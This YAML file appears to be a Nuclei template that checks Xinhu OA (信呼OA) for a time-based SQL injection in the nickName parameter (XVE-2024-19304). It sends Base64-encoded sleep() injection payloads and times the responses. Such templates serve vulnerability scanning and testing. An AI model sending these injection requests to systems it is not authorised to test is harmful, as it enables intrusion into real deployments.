id: xinhuOA-nickName-sql

info:
  name: 信呼OA nickName SQL注入漏洞(XVE-2024-19304)
  author: unknown
  severity: high
  tags: sql injection


http:
  - raw:
      - |
        GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDYpIw== HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /index.php?m=openmodhetong|openapi&d=task&a=data&ajaxbool=0&nickName=MScgYW5kIHNsZWVwKDEwKSM= HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=6 && duration_1<=7'  
          - 'duration_2>=10 && duration_2<=11'






